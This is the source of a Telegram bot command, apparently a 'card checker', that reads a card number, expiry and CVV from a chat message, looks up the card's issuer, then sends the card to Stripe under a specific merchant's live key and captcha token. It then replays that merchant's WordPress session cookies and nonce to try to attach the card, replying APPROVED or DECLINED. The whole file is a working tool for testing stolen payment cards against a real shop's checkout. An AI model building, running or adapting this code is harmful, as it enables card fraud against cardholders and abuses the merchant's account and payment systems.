# commands/auth.py
from aiogram import Router, types
from aiogram.filters import Command
import asyncio
import requests
import json
import sys

router = Router()

async def run_sync(func, *args, **kwargs):
    return await asyncio.to_thread(func, *args, **kwargs)

async def get_bin_info(bin6):
    """Enhanced BIN lookup with fallbacks."""
    info = {
        "bank": "Unknown",
        "brand": "Unknown",
        "type": "Unknown",
        "country": "Unknown",
        "prepaid": False
    }
    
    # 1. Try binlist.net with proper headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    try:
        resp = await run_sync(requests.get, f"https://lookup.binlist.net/{bin6}", headers=headers, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            info["bank"] = data.get('bank', {}).get('name', 'Unknown')
            info["brand"] = data.get('brand', 'Unknown')
            info["type"] = data.get('type', 'Unknown')
            info["country"] = data.get('country', {}).get('name', 'Unknown')
            info["prepaid"] = data.get('prepaid', False)
    except Exception as e:
        # If binlist fails, we'll use fallbacks
        pass
    
    # 2. If brand still unknown, try a secondary free API
    if info["brand"] == "Unknown":
        try:
            # Using a free BIN API (bin.ueuo.com)
            resp2 = await run_sync(requests.get, f"https://bin.ueuo.com/{bin6}", timeout=3)
            if resp2.status_code == 200:
                data2 = resp2.json()
                info["brand"] = data2.get('brand', info["brand"])
                info["bank"] = data2.get('bank', info["bank"])
                info["type"] = data2.get('type', info["type"])
                info["country"] = data2.get('country', info["country"])
        except:
            pass
    
    # 3. Final fallback: heuristic based on first digit
    if info["brand"] == "Unknown":
        first = bin6[0]
        if first == '3':
            info["brand"] = "American Express"
            if info["bank"] == "Unknown":
                info["bank"] = "American Express"
        elif first == '4':
            info["brand"] = "Visa"
        elif first == '5':
            info["brand"] = "MasterCard"
        elif first == '6':
            info["brand"] = "Discover"
        # For Amex, also set type to credit if unknown
        if first == '3' and info["type"] == "Unknown":
            info["type"] = "credit"
    
    # Clean up country name (remove trailing "(the)" if present)
    if info["country"] == "United States of America (the)":
        info["country"] = "United States"
    
    return info

@router.message(Command("auth"))
async def cmd_auth(message: types.Message):
    # --- Parse input: /auth CC|MM|YY|CVV or CC|MM|YYYY|CVV ---
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer(
            "❌ **Usage:** `/auth CC|MM|YY|CVV` or `/auth CC|MM|YYYY|CVV`\n"
            "Example: `/auth 374355111111111|12|28|1234`"
        )
        return

    raw = parts[1].strip()
    try:
        cc, mm, year_str, cvv = [x.strip() for x in raw.split('|')]
        mm = mm.zfill(2)
        if len(year_str) == 2:
            yyyy = str(2000 + int(year_str))
        else:
            yyyy = year_str
    except Exception:
        await message.answer("❌ **Invalid format.** Use: `CC|MM|YY|CVV` or `CC|MM|YYYY|CVV`")
        return

    progress = await message.answer("⏳ **Checking card...**")

    try:
        # ========== ENHANCED BIN LOOKUP ==========
        await progress.edit_text("🔍 **Looking up BIN...**")
        bin6 = cc[:6]
        bin_info_dict = await get_bin_info(bin6)
        bin_info = (
            f"🏦 **BIN:** `{bin6}`\n"
            f"🏛 **Bank:** {bin_info_dict['bank']}\n"
            f"💳 **Brand:** {bin_info_dict['brand']}\n"
            f"🌍 **Country:** {bin_info_dict['country']}\n"
            f"✅ **Type:** {bin_info_dict['type']}\n"
            f"💳 **Prepaid:** {'YES' if bin_info_dict['prepaid'] else 'NO'}\n\n"
        )

        # ========== STRIPE API (create payment method) ==========
        await progress.edit_text("💳 **Sending to Stripe...**")
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        }
        # The exact same data string from your original Termux script (full, unmodified)
        data = (
            f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yyyy}&'
            f'card[exp_month]={mm}&allow_redisplay=unspecified&'
            f'billing_details[address][postal_code]=10080&billing_details[address][country]=US&'
            f'pasted_fields=number&payment_user_agent=stripe.js%2F6f8494a281%3B+stripe-js-v3%2F6f8494a281%3B+'
            f'payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fdermajem.com&'
            f'time_on_page=217817&client_attribution_metadata[client_session_id]=295f2c88-5a62-4910-8363-8418609ed120&'
            f'client_attribution_metadata[merchant_integration_source]=elements&'
            f'client_attribution_metadata[merchant_integration_subtype]=payment-element&'
            f'client_attribution_metadata[merchant_integration_version]=2021&'
            f'client_attribution_metadata[payment_intent_creation_flow]=deferred&'
            f'client_attribution_metadata[payment_method_selection_flow]=merchant_specified&'
            f'client_attribution_metadata[elements_session_id]=elements_session_15nJrLPnkyz&'
            f'client_attribution_metadata[elements_session_config_id]=8c56aff6-acba-48e4-8ecb-2ac6776a1e06&'
            f'client_attribution_metadata[merchant_integration_additional_elements][0]=payment&'
            f'guid=6d341d25-7546-4dac-ab9f-40ae8b23d4538560cc&'
            f'muid=1aa75de9-b5a2-41cb-85e7-01ab46385f4707f05a&'
            f'sid=65c8cb44-fa13-4fd5-9aa6-e7b453526a759f2ab3&'
            f'key=pk_live_51RnLhiKXxVMmJZXpcM0iYR1eqQdP0DP9q8NztbmmwPLMgUolXd3l4xMrJrgJdCb1Ht8jA8uVc2NQ6cffhZgD4GIM00kwsSeJCQ&'
            f'_stripe_version=2024-06-20&'
            f'radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzc1MzkzOTc4LCJjZGF0YSI6Ik84by9BcnNRczZKcFN3Q3FjNXJXWnRDa0wwckIxeW1ydEZxSEo0NFc5c2s3c0swVkYyK2ZVR1dPRVBUYzFlcnphS3RneS9CcE11LzlBb1RsWDJrcE5tK0IzMWl5TUJWaHZTQmxibDkwRkhURXF6WUFXOHkwU3dlV1I0Y1Rmbk5tSkJqa1hKeEFCcWhMZUc1bGY1RFpFbWhvVVQzdnJVNUgzSEVoV2YzSVhSaDV3YkZhVHBCS3l1Q3k4UWZLZ2F4a21GeXE0S3d1MUFUMzN5d2hSczRNTXdEZ2E5REs3clR0ZEZxTnBlWVlNNVl0elpuZjV4SDBiQnVGRHorbjJqb3RKWHd1N0NSWE9PdDNZYVBXME5mSmV4NU95bElEa2RrdGpHV2RLb3RPa2E2YzZBYjJtbTBQNkJtL1BkM1o0Sm5JYWFoMm5VeVAxRjA5dllKWG9VYnp1MDJOVlFkWTRPWlpnVGR5L1JaWlFoST1kbzBaRG9iTzYzSHlNUE8zIiwicGFzc2tleSI6IkFuZDRoaWdycXhCdHVnb1BpS2VlNXhaaTE0Z3IxV2FsUzhia3dpVitlOExwcVduNmxic3lDU1lOU2hTaFF0WjBBc2REY2lKTXlhNDlVWXNTeWhnZDNtMTBIbStNZENNb05QYVorNHlVSURwY2Zxd3BwUHdzdGV5Q3VqSm42SWJXVkhKenh6K1lncVF4L0ZKUnRMeWV4WENoR0tVNDY3U1FSZ2R5dm1pWFUvWllGQTlPWWoyTjhXb3V5VmZpdGEvbEhNb0NWQXlYUk81TzZmei9FZDNpb3ljYzVjNXJlMVlZT3FZcW83Q1lXTHRoZndvMVpQbUJvL0NqTDFXaXN4d0Z3dDVNcUZuR2dmN2FYV0l6blcvRHEzaW1CbUdiV1JVRG04emIycVNpNERNK1ZYRGd1TFZFMWN5N1dkUGk4TEVQcEhqWTVVR1JycXRzTy9peTIxZEQ4MVI5WFlyaWhnLzdHU2tIaEt6TmVaa3FWU3pxTGVpNFp6bVBuTlA4Nmh6SEk4ODk5cnQyRVp5N3hSSFRsZ3lIZXpIQWpWWjBXRzR0TTByN0IybnBka2NpT1M5L2lWSi9SRDV2NXFlS1p3Vm5MV3UySU9hL0lETDA0akkrOE9UY1RBcGFKWVZnc2lyVWJyZ0JqaFRLTjBLdm51cEtGV2JTMk9BOFNyU3Z1OFFvejd3ZjltNmFmeXpCUFpBY3BoUURmSFBQQU5vNjRtY3FRN1JTN3VQLzA2TDBmd2lxNHU4ZVBLOUV4ek5YOWQyVHpwZExvTktZUDF5MVo1bzI3SGJybEJXMTUvNHljbkY3bzBLZGlkOWloR3I5dnpEV0UzNE4zbzdKcU1lSkxRYmJUKzlPeVZhRThTT0hUdmJ1MjN5MXlDNW1LckZNUmVTZyszN3RyNUlGS2JFUmNmZEtUeHlBTCtsWEZlVFBVZTg2RTBJMTJrRmxUbE1iUFJqQXh3Y0cxRllBbVpha01kSVJ4Y1BnYU4yRkdGRmRUYzkxSWhKUG1kenpDVXA1V1V1eERtTXhUMUprNzhMR3J0dkhRbWp1em1TcDlXN2JJYWxwbVJEVGlsdFJuSWVDMmVlMzgvYTNldFlDaW1TQ2wzbU04MWxHRm9tMGFjSHpPMlpidjJMYm9BSTU3aHV1SzREVm42ZWN0QTVibVlpY0g3anppNE1wUlYyeUNiOTlWZkNoSE9jTzJ6YXY0RlFPUFpvQktLS3JBV3djemFYZGhpUXZ2NTh3MlJ4L0x0VDhpM1lPaTdMRGhFSmFNdWw1NzdXTHdwcFpHV3JhUXlxNURUOTFnbzNtTjJ5RWlBdjJOcitydElXYkdMMVN4Z0xjSU9MK01LUUVERTRGS2ZVaU5GY1REeUFMcC9uRU5PSjVaaDR3ckhzTUxXcGd6eHpoL2cxOFp4TlJkaUNuZEZ5K3Z5bllQL3ozbjA4ZVRyVlBISTB1N1kxRnoyTXJiZDdWNVdKY0ZDQkxqWHFiSjR0bHZJV0ExRHM1d0JWMGkzbmUxTDkzTkMyUEphczhJL3htcjhYZTZ6eXBJTHVIR0I2NTlJNVYrRjg3dWRsQlFEeTV5YUgvcWoyMWUxTXRWLzU1cVJwdE45akR5aS90b2dLNmRFVFc2WjZKL2FoNWs2WEs1SG0xL3BFNkVIVGhTMjFac3RTVk9Pd0tDM0ZYQ2RZclZ1UlQ0OUJKWWtBeGtYZEJhUVJyZm1vVVB2bUV6SzhlWGlqWmppVlhFTWNmS2ZlSnRIUEV5dFdSbW5tdHZHdUtQbkZ5Qml0V0RvUUswYndaNzZBL1ZOSlpnN0hxK0tUa01JSWlqcTlEVGU5cEFwSXVseHhnMkIyeFkwWngvZk11VkhWVFBRRjkwaExlYWFDZm5mTTE4R01qVEx2Q0RndWlUQ3lUeCtGYW8wRmQ3NlR0R3owUUd3QWx2YjE0RVpSNlYzMVdobUVsMTlob2JCcUROalV5azdPK0ZRUGE2d0ExK0ZwQXF4VTM1dFlQdFpUU0ZHSlNEcDNxY2NXWE9QWDVramZwS3RWOTlseHhuWXJDSUxYZldMNHBJdVlNQnM5b2ZRNEQxZ3JPdlVyVUNOa096c25nTlJKTGozSlV3ZWdVL2VLQTczMXMyTVMveWtuSCtZNHZYYjZaNFJnQ3M2Z3NZNC9CYWpoS05jdHM0RUZISU1KT3FrWU8xTUFCdFZHaU8vU2xSQTlCb2QvMDE2YnhwdXNYNUpCcW1IUVhRNmJ4ZHJMTDFReGptOTdydVJhbG9jNVk3TjFHb3NVZVdJK05pVysrQ2p1a1d0ejZKMHFkSVJydEw0SEtPVTg5MmNMeUU0dDJyeEVKSUZ6cGx1TmxpK3M2WGp1aTZ1UlB2dWVxd2lZZmJadjFUUFEwMVQxblZhdUNhakovd1cveGZySXhHaDMrL0F3bE5PSEJuL09xZkowVlFjdGlMdzN6cnNSRW9XSlVXM1FOSHJsazVadDgvUnl2dmUvQlBwMFYyN0M1ZVJ5UWUvK3UxbzJPYmFqYVVCaTloNFRDRnF3RjBTRmNWZnIybTdPMmRRR3p6OGdZa1dRUEt2SGVvUllsZW1Fc0FlU3Zua25ZY1lJUExIVnRSRURrdlp2OTNEZ3NGNHpCWEMrWmtDOTA0cHB5TW94WDdjM296ekhrQllqMVovTVYzWk96WnBJcTNYaVRyNjBvQmZTZk1kS3hRNXFHcnBUSlJtSXpsTWJ2czE3UFZpbW5OUDlpMXdtZnljeDUxNXhlNERBOVFmZUk4RW9GdVlncXRpNkZBQW9Jb3dIZEFJSDJQdzl1K0trYmZhUzAxaUVPZGxCU3FkRTZ2R2lqQ0RPTTg4a1hrbjdQMHZrc21LZzAwSkFPTXFqMDlDTzJmN0VRcFUrNFBvWXowTDlDRjBhY2swcmdIdz09Iiwia3IiOiI0NDg1NmMxMyIsInNoYXJkX2lkIjozNjI0MDY5OTZ9.J6r1-o8JG8I4VcfrIYx3ulp7zva4duHMtIHCYca0j3M'
        )
        response = await run_sync(requests.post, 'https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        if response.status_code != 200:
            await progress.edit_text(
                f"{bin_info}❌ **Stripe API error**\n```\n{response.text[:400]}\n```"
            )
            return

        pm_data = response.json()
        payment_method_id = pm_data.get('id')
        if not payment_method_id:
            await progress.edit_text(
                f"{bin_info}❌ **Stripe did not return a payment method ID.**"
            )
            return

        # ========== WORDPRESS VAULT REQUEST ==========
        await progress.edit_text("🔄 **Vaulting with merchant...**")
        cookies = {
            '_cq_duid': '1.1775393534.EuVaXrpREcFZJZ4y',
            '_cq_suid': '1.1775393534.sbS4UMPGI40xI0Wz',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2026-04-05%2012%3A52%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fdermajem.com%2Fproduct%2Fpicoprime%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2026-04-05%2012%3A52%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fdermajem.com%2Fproduct%2Fpicoprime%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F140.0.0.0%20Safari%2F537.36',
            '_gcl_au': '1.1.306004318.1775393535',
            '_ga': 'GA1.1.1028033842.1775393536',
            '_fbp': 'fb.1.1775393535523.117421982815022386',
            'checkout_continuity_service': '72f7f119-eab2-4426-972b-cd016fe3549d',
            '__stripe_mid': '1aa75de9-b5a2-41cb-85e7-01ab46385f4707f05a',
            '__stripe_sid': '65c8cb44-fa13-4fd5-9aa6-e7b453526a759f2ab3',
            'dermajem-_zldp': 'mWCbOn%2Fi0C5RmrX5xX90xmRDfTKV6Uy%2FHLY0nSh72OoZ7zDVMabFgDVDaDDM3JDLIRgzEMc8DME%3D',
            'dermajem-_zldt': 'ec999a46-9c9f-4cfd-8718-f56e8057717b-2',
            '__wopb_recently_viewed': '15224',
            'woosw_key': '3Z9HSX',
            'wordpress_logged_in_62bf817983a9d3ce02ec4e5ce495cdb8': '2grxnitmq9%7C1775998360%7Cmy2Y4n55Pe5ZzbCupiwqqHjVousXuSE5zZ1zl5g3HU1%7C70d90cf6ce23237785f93859044838c0714306b21bf61c216ae278c79b9ff8c4',
            'wp_automatewoo_visitor_62bf817983a9d3ce02ec4e5ce495cdb8': '6fijx54unkbmq62coklq',
            'wp_automatewoo_session_started': '1',
            '_cq_session': '1.1775393534938.EZ4W4MuQlOcXg93S.1775393639747',
            'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdermajem.com%2Fmy-account%2Fadd-payment-method%2F',
            '_monsterinsights_uj': '{"1775393535":"https%3A%2F%2Fdermajem.com%2Fproduct%2Fpicoprime%2F%7C%23%7CPicoprime%20%7C%20DermaJEM%7C%23%7C15224","1775393541":"https%3A%2F%2Fdermajem.com%2Fmy-account%2F%7C%23%7CMy%20account%20%7C%20DermaJEM%7C%23%7C9","1775393575":"https%3A%2F%2Fdermajem.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20%7C%20DermaJEM%7C%23%7C9","1775393581":"https%3A%2F%2Fdermajem.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CMy%20account%20%7C%20DermaJEM%7C%23%7C9","1775393593":"https%3A%2F%2Fdermajem.com%2Fmy-account%2Fedit-address%2F%7C%23%7CMy%20account%20%7C%20DermaJEM%7C%23%7C9","1775393598":"https%3A%2F%2Fdermajem.com%2Fmy-account%2Fedit-address%2Fbilling%2F%7C%23%7CMy%20account%20%7C%20DermaJEM%7C%23%7C9","1775393633":"https%3A%2F%2Fdermajem.com%2Fmy-account%2Fedit-address%2F%7C%23%7CMy%20account%20%7C%20DermaJEM%7C%23%7C9","1775393637":"https%3A%2F%2Fdermajem.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CMy%20account%20%7C%20DermaJEM%7C%23%7C9","1775393640":"https%3A%2F%2Fdermajem.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CMy%20account%20%7C%20DermaJEM%7C%23%7C9"}',
            '_ga_JK6W0P2Z05': 'GS2.1.s1775393535$o1$g1$t1775393640$j16$l0$h0',
            '_ga_26CPLWNYLM': 'GS2.1.s1775393535$o1$g1$t1775393746$j18$l0$h0',
            '_ga_NTJZDWZ03B': 'GS2.1.s1775393535$o1$g1$t1775393757$j7$l0$h0',
        }
        headers2 = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://dermajem.com',
            'referer': 'https://dermajem.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        data2 = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': 'f443edbadd',
        }
        vault_resp = await run_sync(requests.post, 'https://dermajem.com/', params=params, cookies=cookies, headers=headers2, data=data2)

        # ========== RESULT ==========
        if vault_resp.status_code == 200 and ('"success":true' in vault_resp.text or 'succeeded' in vault_resp.text.lower()):
            await progress.edit_text(
                f"{bin_info}✅ **APPROVED**\nCard successfully added to vault.\n⚡⚡⚡ VAULTED ⚡⚡⚡"
            )
        else:
            await progress.edit_text(
                f"{bin_info}❌ **DECLINED**\nYour card was declined."
            )

    except Exception as e:
        await progress.edit_text(f"❌ **Error:** {str(e)}")
